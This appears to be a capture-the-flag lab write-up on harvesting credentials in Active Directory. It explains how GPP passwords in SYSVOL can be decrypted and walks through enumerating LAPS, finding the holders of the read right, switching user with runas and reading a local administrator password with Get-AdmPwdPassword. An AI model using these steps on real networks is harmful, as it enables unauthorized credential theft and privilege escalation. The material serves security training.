# Local Administrator Password Solution

GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, 
different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and 
creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission.

Once upon a time, the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that 
time, the encryption was good enough until Microsoft somehow published its private key on [MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be). 
And because Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. 
One of the tools to crack the SYSVOL encrypted password is [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).

In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.

The new method includes two new attributes (`ms-mcs-AdmPwd` and `ms-mcs-AdmPwdExpirationTime`) of computer objects in 
the Active Directory. The `ms-mcs-AdmPwd` attribute contains a clear-text password of the local administrator, while 
the `ms-mcs-AdmPwdExpirationTime` contains the expiration time to reset the password. LAPS uses `admpwd.dll` to 
change the local administrator password and update the value of `ms-mcs-AdmPwd`.

Enumerating for LAPS:

```text
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022  01:01 PM    <DIR>          .
06/06/2022  01:01 PM    <DIR>          ..
05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
               2 Dir(s)  10,184,249,344 bytes free
```

Switch:

    C:\Users\thm>powershell
    Windows PowerShell
    Copyright (C) Microsoft Corporation. All rights reserved.

Listing the available PowerShell cmdlets for LAPS:
    
```text
PS C:\Users\thm> Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
```

Finding Users with AdmPwdExtendedRights Attribute:

```text
PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\LAPsReader}
```

Finding Users belong to THMLAPsReader Group:

```text
PS C:\Users\thm> net groups "LAPsReader"
Group name     LAPsReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.
```

Info:

```text
PS C:\Users\thm> net user bk-admin
User name                    bk-admin
Full Name                    THM Admin BK
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/4/2022 10:33:48 AM
Password expires             Never
Password changeable          6/5/2022 10:33:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/9/2022 3:47:28 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
                             *LAPsReader           *Enterprise Admins
The command completed successfully.
```

Switch to `bk-admin`:

```text
PS C:\Users\thm> runas /savecred /user:THM.red\bk-admin cmd.exe
Attempting to start cmd.exe as user "THM.red\bk-admin" ...
Enter the password for THM.red\bk-admin:
Attempting to start cmd.exe as user "THM.red\bk-admin" ...
PS C:\Users\thm>
```

Get password:

```text
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    THMLAPSPassw0rd    2/11/2338 11:05:2...


PS C:\Windows\system32>
```
